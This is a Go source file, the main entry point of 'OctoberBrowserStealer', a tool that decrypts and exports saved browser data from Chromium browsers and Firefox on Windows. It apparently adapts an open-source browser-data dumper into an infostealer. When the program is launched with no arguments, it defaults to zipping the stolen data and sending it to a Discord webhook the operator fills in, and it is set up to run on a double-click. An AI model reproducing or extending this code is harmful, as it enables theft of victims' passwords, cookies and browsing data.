package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"

	"src/log"
)

var verbose bool

func rootCmd() *cobra.Command {
	root := &cobra.Command{
		Use:   "OctoberBrowserStealer",
		Short: "A CLI tool for decrypting and exporting browser data",
		Long: `OctoberBrowserStealer decrypts and exports browser data from Chromium-based
browsers and Firefox on Windows.

@Hollow33n`,
		PersistentPreRun: func(cmd *cobra.Command, args []string) {
			if verbose {
				log.SetVerbose()
			}
		},
	}

	root.CompletionOptions.HiddenDefaultCmd = true

	root.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "enable debug logging")

	dump := dumpCmd()
	root.AddCommand(dump, listCmd(), keysCmd(), versionCmd())

	// Default to dump when no subcommand is given.
	// Copy dump flags to root so that `hack-browser-data -b chrome`
	// works the same as `hack-browser-data dump -b chrome`.
	root.RunE = func(cmd *cobra.Command, args []string) error {
		return dump.RunE(dump, args)
	}
	dump.Flags().VisitAll(func(f *pflag.Flag) {
		if root.Flags().Lookup(f.Name) == nil {
			root.Flags().AddFlag(f)
		}
	})

	return root
}

func main() {
	configureDoubleClickMode()
	// Small description and GitHub link shown when the CLI runs.
	fmt.Println("GitHub: https://github.com/Hollow33n")
	// If no command-line arguments are provided, populate default args.
	if len(os.Args) == 1 {
		os.Args = []string{
			os.Args[0],
			"--discord-webhook",
			"", // [*] your discord web hook here
			"--zip",
		}
	}
	if err := rootCmd().Execute(); err != nil {
		os.Exit(1)
	}
}
